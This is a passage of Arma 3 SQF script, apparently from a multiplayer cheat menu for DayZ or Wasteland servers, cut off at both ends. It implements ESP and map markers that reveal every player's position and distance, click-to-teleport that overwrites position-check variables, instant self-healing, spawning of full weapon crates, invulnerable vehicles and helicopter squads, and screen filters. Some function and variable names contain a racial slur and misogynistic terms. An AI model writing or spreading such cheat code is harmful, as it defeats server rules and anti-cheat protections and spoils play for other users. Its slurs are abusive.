					_mkr setMarkerSizeLocal [1,1];
					if ((side _x == side player) and (side _x != resistance)) then {_mkr setMarkerColorLocal "ColorWhite";}else{_mkr setMarkerColorLocal "ColorRedAlpha";};
					_mkr setMarkerTextLocal format ["%1 --- %2", name _x,round(_x distance player)];
					if (_x == player) then 
					{	
						_mkr setMarkerColorLocal "ColorGreen";
					};
					Wookie_Bitches set [count Wookie_Bitches, _x];
					[_x, _mkr] spawn 
					{ 
						private ["_u", "_m"]; 
						_u = _this select 0; 
						_m = _this select 1; 
						while {(Wookie_Map_Markers == 1) and (alive _u) and (vehicle _u == _u) and (getPlayerUID _u != "") } do 
						{
							_m setMarkerPosLocal ([visiblePosition _u select 0, visiblePosition _u select 1, 0]); 
							sleep 0.01; 
						}; 
						deleteMarkerLocal _m;	
						if (_u in Wookie_Bitches) then 
						{ 
							Wookie_Bitches set [(Wookie_Bitches find _u), -1]; 
							Wookie_Bitches = Wookie_Bitches - [-1];
						}; 					
						true;
					}; 
				};
			};
		} forEach playableUnits;
	sleep 0.3;
	};
	{_mkr = str _x; deleteMarkerLocal _mkr;} forEach playableUnits;
};

Wookie_ESP =
{
	if (isnil ("WookieESP")) then {WookieESP = 0;};
	if (WookieESP==0) then {WookieESP=1;cutText [format["Esp On"], "PLAIN DOWN"];hint "Esp On";}else{WookieESP=0;cutText [format["Esp Off"], "PLAIN DOWN"];hint "Esp Off";};

	if (WookieESP==1) then 
	{
		onEachFrame
		{
			_nigs = nearestobjects [player,["CAManBase"],1400];
			{
				if((side _x != side player) && (getPlayerUID _x != "") && ((player distance _x) < 1400)) then 
				{
					drawIcon3D ["", [1,0,0,0.7], [visiblePosition _x select 0, visiblePosition _x select 1, 2], 0.1, 0.1, 45, (format ["%2 : %1m",round(player distance _x), name _x]), 1, 0.03, "default"]
				}
				else
				{
					if((getPlayerUID _x != "") && ((player distance _x) < 1000)) then 
					{
						drawIcon3D ["", [0,1,0.5,0.4], [visiblePosition _x select 0, visiblePosition _x select 1, 2], 0.1, 0.1, 45, (format ["%2 : %1m",round(player distance _x), name _x]), 1, 0.03, "default"]
					};
				};
			} foreach playableUnits;
		};
	}
	else
	{
		onEachFrame {nil};
	};
};

Wookie_VehM =
{
	if !("ItemMap" in items player) then {player addweapon "ItemMap";};

	if (isnil "Wookie_Veh_M") then {Wookie_Veh_M = 0;}; if (Wookie_Veh_M == 0) then {Wookie_Veh_M = 1; hint "Vehicle Markers ON";} else {Wookie_Veh_M = 0; hint "Vehicle Markers OFF";};
	while {Wookie_Veh_M == 1} do
	{
		{
			Wookie_Veh_Markers = str _x;
			deleteMarkerLocal Wookie_Veh_Markers;
			Wookie_Veh_Markers = createMarkerLocal [Wookie_Veh_Markers, visiblePosition _x];
			Wookie_Veh_Markers setMarkerTypeLocal "waypoint";
			Wookie_Veh_Markers setMarkerPosLocal visiblePosition _x;
			Wookie_Veh_Markers setMarkerSizeLocal [0.5,0.5];
			Wookie_Veh_Markers setMarkerTextLocal format['%1',typeOf _x];
			if ((_x isKindOf "Air") || (_x isKindOf "Tank")) then {Wookie_Veh_Markers setMarkerColorLocal ("ColorRed");} else {Wookie_Veh_Markers setMarkerColorLocal ("ColorBlue");};
		} forEach vehicles;
	sleep 1;
	};
	{Wookie_Veh_Markers = str _x; deleteMarkerLocal Wookie_Veh_Markers;} forEach vehicles;
};

Wookie_Tele =
{
	closeDialog 0;
	player setVariable ["lastPosition", myvar23];
	player setVariable ["lastTimes", myvar23];
	if !("ItemMap" in items player) then {player addweapon "ItemMap";};

	Wookie_so_fly=
	{
		vehicle player setPosATL [_this select 0, _this select 1, 0];
		
		onMapSingleClick "";
		openMap [false, false];
	};

	openMap [true, false];
	onMapSingleClick "[_pos select 0, _pos select 1, _pos select 2] call Wookie_so_fly";
};

Wookie_HealSelf =
{
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then 
	{
		r_player_handler = false;
		r_player_handler1 = false;
		r_player_dead = false;
		r_player_unconscious = false;
		r_player_infected = false;
		r_player_injured = false;
		r_player_inpain = false;
		r_player_loaded = false;
		r_player_cardiac = false;
		r_fracture_legs = false;
		r_fracture_arms = false;
		r_player_blood = 12000;
		r_player_lowblood = false;
		r_player_timeout = 0;
		r_handlerCount = 0;
		dayz_hunger = 0;
		dayz_thirst = 0;
		dayz_temperatur = 42;
		player setDamage 0;
		vehicle player setDamage 0;
	}
	else
	{
		player setDamage 0;
		vehicle player setDamage 0;
	};
	cutText [format["Healed"], "PLAIN DOWN"];
};

Wookie_SpawnCrate =
{
	_dir = getdir vehicle player;
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+1.5*sin(_dir),(_pos select 1)+1.5*cos(_dir),0];
	_box = createVehicle ["box_NATO_AMMO_F", _pos, [], 0, ''];

	clearWeaponCargo _box;
	clearMagazineCargo _box;
	clearItemCargo _box;
	clearBackpackCargo _box;

	_cfgweapons = configFile >> "CfgWeapons";
	_weapons = [];
	for "_i" from 0 to (count _cfgWeapons)-1 do
	{
	_cur_wep = _cfgweapons select _i;
			
		if(isClass _cur_wep) then
		{
			_classname = configName _cur_wep;
			_wep_type = getNumber(_cur_wep >> "type");
			_scope = getNumber(_cur_wep >> "scope");
			_picture = getText(_cur_wep >> "picture");
			if(_scope >= 2 && _wep_type in [1,2,4,4096] && _picture != "" && !(_classname in _weapons) && _classname != "NVGoggles") then
			{
				_weapons set[count _weapons, _classname];
			};
		};
		if (_i % 10==0) then 
		{
			hintsilent format["Spawning Weapons %1",count _weapons];
			sleep 0.0001;
		};
	};

	sleep 0.1;
		
	_cfgweapons = configFile >> "CfgMagazines";
	_magazines = [];
		
	for "_i" from 0 to (count _cfgWeapons)-1 do
	{
	_cur_wep = _cfgweapons select _i;
			
		if(isClass _cur_wep) then
		{
			_classname = configName _cur_wep;
			_scope = getNumber(_cur_wep >> "scope");
			_picture = getText(_cur_wep >> "picture");
			if(_scope >= 2 && _picture != "" && !(_classname in _magazines)) then
			{
				_magazines set[count _magazines, _classname];
			};
		};
		if (_i % 10==0) then 
		{
			hintsilent format["Spawning Mags %1",count _magazines];
			sleep 0.0001;
		};
	};
	
	{ _box addWeaponCargo [_x,50]; } foreach _weapons;
	{ _box addMagazineCargo [_x,50]; }foreach _magazines;

	sleep 0.1;

	_cfgweapons = configFile >> "CfgWeapons";
	_items = [];
		
	for "_i" from 0 to (count _cfgWeapons)-1 do
	{
	_cur_wep = _cfgweapons select _i;
			
		if(isClass _cur_wep) then
		{
			_classname = configName _cur_wep;
			_wep_type = getNumber(_cur_wep >> "type");
			_scope = getNumber(_cur_wep >> "scope");
			_picture = getText(_cur_wep >> "picture");
			if(_scope >= 2 && _wep_type in [131072,4096] && _picture != "" && !(_classname in _items) && _classname != "Binocular") then
			{
				_items set[count _items, _classname];
			};
		};
		if (_i % 10==0) then 
		{
			hintsilent format["Spawning Items %1",count _items];
			sleep 0.0001;
		};
	};
		
	{ _box addItemCargo [_x,50]; } foreach _items;

	sleep 0.1;

	_cfgweapons = configFile >> "CfgVehicles";
	_backpacks = [];
		
	for "_i" from 0 to (count _cfgWeapons)-1 do
	{
	_cur_wep = _cfgweapons select _i;
			
		if(isClass _cur_wep) then
		{
			_classname = configName _cur_wep;
			_wep_type = getText(_cur_wep >> "vehicleClass");
			_scope = getNumber(_cur_wep >> "scope");
			_picture = getText(_cur_wep >> "picture");
			if(_scope >= 2 && _wep_type == "Backpacks" && _picture != "" && !(_classname in _backpacks)) then
			{
				_backpacks set[count _backpacks, _classname];
			};
		};
		if (_i % 10==0) then 
		{
			hintsilent format["Spawning Backpacks %1",count _backpacks];
			sleep 0.0001;
		};
	};
		
	{ _box addBackPackCargo [_x,5]; } foreach _backpacks;
	sleep 0.1;
	hint "Weapon Crate Ready";
	titleText ["                       \nCrate Spawned..","PLAIN"]; titlefadeout 5;
};

Wookie_DelCrate =
{
	{ deleteVehicle _x } forEach (allMissionObjects "box_NATO_AMMO_F");
	hint "All Weapon Boxes Deleted";
};

Wookie_SexyHeliLol =
{
	_obj="O_Ka60_F";
	_dir = getdir vehicle player;
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+18*sin(_dir),(_pos select 1)+18*cos(_dir),0];
	MR_KA60 = createVehicle [_obj, _pos, [], 0, '']; 
	MR_KA60 setDir _dir;

	sleep 1;
	
	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR allowDamage false;
	
	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR1 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR1 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR2 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR2 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR3 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR3 allowDamage false;
	
	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR4 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR4 allowDamage false;
	
	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR5 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR5 allowDamage false;
	
	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR6 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR6 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR7 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR7 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR8 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR8 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR9 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR9 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR10 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR10 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR11 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR11 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR12 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR12 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR13 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR13 allowDamage false;

	_obj="B_Hunter_F";
	_pos = getPosATL vehicle player;
	_pos = [(_pos select 0)+random 500*sin(_dir),(_pos select 1)+random 500*cos(_dir),0];
	MR_CAR14 = createVehicle [_obj, _pos, [], 0, ''];
	MR_CAR14 allowDamage false;

	MISS_KA60 = MR_KA60;
	MISS_CAR = MR_CAR;
	MISS_CAR1 = MR_CAR1;
	MISS_CAR2 = MR_CAR2;
	MISS_CAR3 = MR_CAR3;
	MISS_CAR4 = MR_CAR4;
	MISS_CAR5 = MR_CAR5;
	MISS_CAR6 = MR_CAR6;
	MISS_CAR7 = MR_CAR7;
	MISS_CAR8 = MR_CAR8;
	MISS_CAR9 = MR_CAR9;
	MISS_CAR10 = MR_CAR10;
	MISS_CAR11 = MR_CAR11;
	MISS_CAR12 = MR_CAR12;
	MISS_CAR13 = MR_CAR13;
	MISS_CAR14 = MR_CAR14;
	MISS_CAR attachto [MISS_KA60,[3,8,0]];
	MISS_CAR1 attachto [MISS_KA60,[3,4,0]];
	MISS_CAR2 attachto [MISS_KA60,[3,0,0]];
	MISS_CAR3 attachto [MISS_KA60,[3,-4,0]];
	MISS_CAR4 attachto [MISS_KA60,[3,-8,0]];
	MISS_CAR5 attachto [MISS_KA60,[0,0,0]];
	MISS_CAR6 attachto [MISS_KA60,[1,8,0]];
	MISS_CAR7 attachto [MISS_KA60,[1,-8,0]];
	MISS_CAR8 attachto [MISS_KA60,[-1,8,0]];
	MISS_CAR9 attachto [MISS_KA60,[-1,-8,0]];
	MISS_CAR10 attachto [MISS_KA60,[-3,-8,0]];
	MISS_CAR11 attachto [MISS_KA60,[-3,-4,0]];
	MISS_CAR12 attachto [MISS_KA60,[-3,0,0]];
	MISS_CAR13 attachto [MISS_KA60,[-3,4,0]];
	MISS_CAR14 attachto [MISS_KA60,[-3,8,0]];
	player moveinDriver MISS_KA60;
	hint format ["Troll Heli"];
	cutText [format["Troll Heli"], "PLAIN DOWN"];
};

Wookie_RemoveVF =
{
	ppEffectDestroy ppColor;
	ppEffectDestroy ppBlur;
	ppEffectDestroy ppInversion;
	ppEffectDestroy ppGrain;
	ppEffectDestroy nonapsi_ef;
	ppEffectDestroy nonapsi_ef2;
	deletevehicle snow;
	deletevehicle ps;
	ppEffectDestroy ppe;
	ppEffectDestroy ppe2;
	ppEffectDestroy ppe3;
	ppEffectDestroy wetdist1;
	setaperture 0;
	"dynamicBlur" ppEffectAdjust [0];
	"dynamicBlur" ppEffectCommit 16;

	"colorCorrections" ppEffectAdjust [1, 1, 0, [1, 1, 1, 0.0], [1, 1, 1, 1],  [1, 1, 1, 0.0]];
	"colorCorrections" ppEffectCommit 0;
};

Wookie_Wasteland_VF =
{
	"colorCorrections" ppEffectAdjust [2, 30, 0, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];
	"colorCorrections" ppEffectCommit 0;
	"colorCorrections" ppEffectAdjust [1, 0.8, -0.001, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];  
	"colorCorrections" ppEffectCommit 3;
	"colorCorrections" ppEffectEnable true;
	"filmGrain" ppEffectEnable true; 
	"filmGrain" ppEffectAdjust [0.02, 1, 1, 0.1, 1, false];
	"filmGrain" ppEffectCommit 5;

	[] spawn {
		waituntil {isplayer player};
		setwind [0.201112,0.204166,true];
		while {true} do {
			_ran = ceil random 5;
			playsound format ["wind_%1",_ran];
			_obj = vehicle player;
			_pos = getPosATL _obj;

			setwind [0.201112*2,0.204166*2,false];
			_velocity = [random 10,random 10,-1];
			_color = [1.0, 0.9, 0.8];
			_alpha = 0.02 + random 0.02;
			_ps = "#particlesource" createVehicleLocal _pos;  
			_ps setParticleParams [["A3\Data_f\ParticleEffects\Universal\universal.p3d", 16, 12, 8], "", "Billboard", 1, 3, [0, 0, -6], _velocity, 1, 1.275, 1, 0, [9], [_color + [0], _color + [_alpha], _color + [0]], [1000], 1, 0, "", "", _obj];
			_ps setParticleRandom [3, [30, 30, 0], [0, 0, 0], 1, 0, [0, 0, 0, 0.01], 0, 0];
			_ps setParticleCircle [0.1, [0, 0, 0]];
			_ps setDropInterval 0.01;

			sleep (random 1);
			deletevehicle _ps;
			_delay = 10 + random 20;
			sleep _delay;
	
		};
	};

	//--- Ash
	[] spawn {
		waituntil {isplayer player};
		_pos = getPosATL player;
		_parray = [
		/* 00 */        ["A3\Data_f\ParticleEffects\Universal\Universal", 16, 12, 8, 1],
		/* 01 */        "",
		/* 02 */        "Billboard",
		/* 03 */        1,
		/* 04 */        4,
		/* 05 */        [0,0,0],
		/* 06 */        [0,0,0],
		/* 07 */        1,
		/* 08 */        0.000001,
		/* 09 */        0,
		/* 10 */        1.4,
		/* 11 */        [0.05,0.05],
		/* 12 */        [[0.1,0.1,0.1,1]],
		/* 13 */        [0,1],
		/* 14 */        0.2,
		/* 15 */        1.2,
		/* 16 */        "",
		/* 17 */        "",
		/* 18 */        vehicle player
		];
		_snow = "#particlesource" createVehicleLocal _pos;  
		_snow setParticleParams _parray;
		_snow setParticleRandom [0, [10, 10, 7], [0, 0, 0], 0, 0.01, [0, 0, 0, 0.1], 0, 0];
		_snow setParticleCircle [0.0, [0, 0, 0]];
		_snow setDropInterval 0.01;

		_oldPlayer = vehicle player;
		while {true} do {
			waituntil {vehicle player != _oldPlayer};
			_parray set [18,vehicle player];
			_snow setParticleParams _parray;
			_oldPlayer = vehicle player;
		};
	};
};

Wookie_BlackNWhite_VF =
{
	setaperture 24;
	ppColor = ppEffectCreate ["ColorCorrections", 1999];
	ppColor ppEffectEnable true;
	ppColor ppEffectAdjust [1, 1, 0, [1, 1, 1, 0], [1, 1, 1, 0.0], [1, 1, 1, 1.0]];
	ppColor ppEffectCommit 0;

	ppBlur = ppEffectCreate ["dynamicBlur", 505];
	ppBlur ppEffectEnable true; 
	ppBlur ppEffectAdjust [.5];
	ppBlur ppEffectCommit 0;

	ppInversion = ppEffectCreate ['colorInversion', 2555];
	ppInversion ppEffectEnable true;
	ppInversion ppEffectAdjust [1,1,1];
	ppInversion ppEffectCommit 0;

	ppGrain = ppEffectCreate ["filmGrain", 2005];
	ppGrain ppEffectEnable true;
	ppGrain ppEffectAdjust [0.02, 1, 1, 0, 1];
	ppGrain ppEffectCommit 0;
};

Wookie_Cotton_1_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.02, [9.5, 1.5, 3.5, 0.2], [9.0, 7.0, 5.2, 4.5],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
	hndl = ppEffectCreate ["wetDistortion", 2006];
	hndl ppEffectEnable true;
	hndl ppEffectAdjust [0, 0.16, 2.32, 2.56, 4.8, 0.64, 0.64, 0, 0, 0.08, 0.08, 0, 0, 0, 0.77];
	hndl ppEffectCommit 0;
};

Wookie_Cotton_2_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.02, [9.5, 1.5, 2.5, 0.2], [2.0, 7.0, 6.0, 2.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
	_hndl = ppEffectCreate ["wetDistortion", 2006];
	_hndl ppEffectEnable true;
	_hndl ppEffectAdjust [0, 0.16, 2.32, 2.56, 4.8, 0.64, 0.64, 0, 0, 0.08, 0.08, 0, 0, 0, 0.77];
	_hndl ppEffectCommit 0;
};

Wookie_CyanGreen_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.02, [2.0, 1.5, 0.0, 0.0], [7.0, 3.0, 4.0, 2.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
	_hndl = ppEffectCreate ["wetDistortion", 2006];
	_hndl ppEffectEnable true;
	_hndl ppEffectAdjust [0, 0.16, 2.32, 2.56, 4.8, 0.64, 0.64, 0, 0, 0.08, 0.08, 0, 0, 0, 0.77];
	_hndl ppEffectCommit 0;
};

Wookie_Dark_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.1, [1.0, 0.2, 0.2, 0.0], [1.0, 0.4, 0.0, 0.1],[1.0,0.3,0.3, 0.5]];
	nonapsi_ef ppEffectCommit 2;

	sleep 0.5;

	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.1, [0.0, 0.0, 0.0, 0.0], [0.0, 0.0, 0.0, 5.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_DarkBlue_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.01, [0.0, 0.0, 0.0, 0.0], [8.0, 5.0, 2.0, 3.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_Gloomy_VF =
{
	ppe = ppEffectCreate ["colorCorrections", 1555]; 
	ppe ppEffectAdjust [1, 0.75, 0, [0.8,0.9,1,-0.1], [1,1,1,2], [-0.5,0,-1,5]]; 
	ppe ppEffectCommit 1;
	ppe ppEffectEnable true; 
	ppe2 = ppEffectCreate ["filmGrain", 1555]; 
	ppe2 ppEffectAdjust [0.1, -1, 0.1, 0.05, 2, false]; 
	ppe2 ppEffectCommit 1;
	ppe2 ppEffectEnable true;
};

Wookie_DarkGolden_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.1, [1.0, 0.2, 0.2, 0.0], [1.0, 0.4, 0.0, 0.1],[1.0,0.3,0.3, 0.5]];
	nonapsi_ef ppEffectCommit 2;
};

Wookie_DarkGreen_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.03, [0.0, 0.0, 0.0, 0.0], [10.0, 0.0, 0.0, 5.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_HighOnXmas_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.03, [0.0, 0.0, 0.0, 0.0], [3.0, 5.0, 9.0, 5.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_NiggaBeFaded_VF =
{
	wetdist1 = ppEffectCreate ["wetDistortion", 2006];
	wetdist1 ppEffectAdjust [1, 1.16, 0.32, 2.56, 0.8, 0.64, 2.64, 0, 0, 1.08, 0.08, 0, 0, 0, 1.77];
	wetdist1 ppEffectEnable true;
	wetdist1 ppEffectCommit 0;
};

Wookie_OldTimey_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.025, [2.0, 0.5, 0.0, 0.0], [0.5, 0.0, 0.5, 1.0],[0.2,0.0,0.0, 8.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_PinkLemonade_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.02, [2.5, 0.5, 0.5, 0.2], [5.0, 2.0, 6.0, 2.0],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_Radiation_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectAdjust [2, 30, 0, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];
	nonapsi_ef ppEffectCommit 0;

	nonapsi_ef ppEffectAdjust [1, 0.8, -0.001, [0.0, 0.0, 0.0, 0.0], [0.8*2, 0.5*2, 0.0, 0.7], [0.9, 0.9, 0.9, 0.0]];
	nonapsi_ef ppEffectCommit 3;
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef2 = ppEffectCreate ["filmGrain", 1555]; 
	nonapsi_ef2 ppEffectEnable true;
	nonapsi_ef2 ppEffectAdjust [0.02, 1, 1, 0.1, 1, false];
	nonapsi_ef2 ppEffectCommit 5;

	[] spawn {
		waituntil {isplayer player};
		setwind [0.201112,0.204166,true];
		while {true} do {
			_ran = ceil random 5;
			playsound format ["wind_%1",_ran];
			_obj = vehicle player;
			_pos = getPosATL _obj;

			//--- Dust
			setwind [0.201112*2,0.204166*2,false];
			_velocity = [random 10,random 10,-1];
			_color = [1.0, 0.9, 0.8];
			_alpha = 0.02 + random 0.02;
			ps = "#particlesource" createVehicleLocal _pos;
			ps setParticleParams [["A3\data_f\ParticleEffects\Universal\universal.p3d", 16, 12, 8], "", "Billboard", 1, 3, [0, 0, -6], _velocity, 1, 1.275, 1, 0, [9], [_color + [0], _color + [_alpha], _color + [0]], [1000], 1, 0, "", "", _obj];
			ps setParticleRandom [3, [30, 30, 0], [0, 0, 0], 1, 0, [0, 0, 0, 0.01], 0, 0];
			ps setParticleCircle [0.1, [0, 0, 0]];
			ps setDropInterval 0.01;

			sleep (random 1);
			deletevehicle ps;
			_delay = 10 + random 20;
			sleep _delay;
	
		};
	};

	//--- Ash
	[] spawn {
		waituntil {isplayer player};
		_pos = getPosATL player;
		_parray = [
		/* 00 */        ["A3\data_f\ParticleEffects\Universal\Universal", 16, 12, 8, 1],//"\Ca\Data\cl_water",
		/* 01 */        "",
		/* 02 */        "Billboard",
		/* 03 */        1,
		/* 04 */        4,
		/* 05 */        [0,0,0],
		/* 06 */        [0,0,0],
		/* 07 */        1,
		/* 08 */        0.000001,
		/* 09 */        0,
		/* 10 */        1.4,
		/* 11 */        [0.05,0.05],
		/* 12 */        [[0.1,0.1,0.1,1]],
		/* 13 */        [0,1],
		/* 14 */        0.2,
		/* 15 */        1.2,
		/* 16 */        "",
		/* 17 */        "",
		/* 18 */        vehicle player
		];
		snow = "#particlesource" createVehicleLocal _pos;
		snow setParticleParams _parray;
		snow setParticleRandom [0, [10, 10, 7], [0, 0, 0], 0, 0.01, [0, 0, 0, 0.1], 0, 0];
		snow setParticleCircle [0.0, [0, 0, 0]];
		snow setDropInterval 0.01;

		_oldPlayer = vehicle player;
		while {true} do {
			waituntil {vehicle player != _oldPlayer};
			_parray set [18,vehicle player];
			snow setParticleParams _parray;
			_oldPlayer = vehicle player;
		};
	};
};

Wookie_RedBlue_VF =
{
	nonapsi_ef = ppEffectCreate ["colorCorrections", 1555]; 
	nonapsi_ef ppEffectEnable true;
	nonapsi_ef ppEffectAdjust [1.0, 1.0, -0.03, [11.2, 0.1, 0.2, 0.2], [12.2, 8.7, 3.6, 7.2],[0.4,0.0,0.0, 0.7]];
	nonapsi_ef ppEffectCommit 1;
};

Wookie_Shrooms_VF =
{
	wetdist1 = ppEffectCreate ["wetDistortion", 2006];
	wetdist1 ppEffectAdjust [0, 8, 0.8,8,8, 0.2, 1, 0, 0, 0.08, 0.08, 0, 0, 0, 0.77];
	wetdist1 ppEffectEnable true;
	wetdist1 ppEffectCommit 0;
	ppe = ppEffectCreate ["colorCorrections", 1555]; 
	ppe ppEffectAdjust [1, 1, 0, [1.5,6,2.5,0.5], [5,3.5,5,-0.5], [-3,5,-5,-0.5]]; 
	ppe ppEffectCommit 1;
	ppe ppEffectEnable true; 
	ppe2 = ppEffectCreate ["chromAberration", 1555]; 
	ppe2 ppEffectAdjust [0.01,0.01,true];
	ppe2 ppEffectCommit 1;
	ppe2 ppEffectEnable true;
	ppe3 = ppEffectCreate ["radialBlur", 1555]; 
	ppe3 ppEffectEnable true;
	ppe3 ppEffectAdjust [0.02,0.02,0.15,0.15]; 
	ppe3 ppEffectCommit 1;
};

Wookie_Spiderman_VF =
{
	ppe = ppEffectCreate ["colorCorrections", 1555]; 
	ppe ppEffectAdjust [1, 1, 0, [1.5,-1,-1.5,0.5], [5,3.5,-5,-0.5], [-3,5,-5,-0.5]]; 
	ppe ppEffectCommit 1;
	ppe ppEffectEnable true; 
	ppe2 = ppEffectCreate ["chromAberration", 1555]; 
	ppe2 ppEffectAdjust [0.01,0.01,true];
	ppe2 ppEffectCommit 1;
	ppe2 ppEffectEnable true;
	ppe3 = ppEffectCreate ["radialBlur", 1555]; 
	ppe3 ppEffectEnable true;
	ppe3 ppEffectAdjust [0.02,0.02,0.15,0.15]; 
	ppe3 ppEffectCommit 1;
};

Wookie_HeliSquad =
{
	_side = side player;
	_side = group player;
	_pos = getPosATL vehicle player;
	_dir = getDir vehicle player;

	cutText [format["Spawning Heli Squad"], "PLAIN DOWN"];

	_distance = -700;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -750;
	[[((_pos) select 0)+_distance*sin(_dir), ((_pos) select 1)+_distance*cos(_dir),300], _dir, 'B_AH9_F', _side] call bis_fnc_spawnvehicle;sleep 0.1;
	_distance = -800;
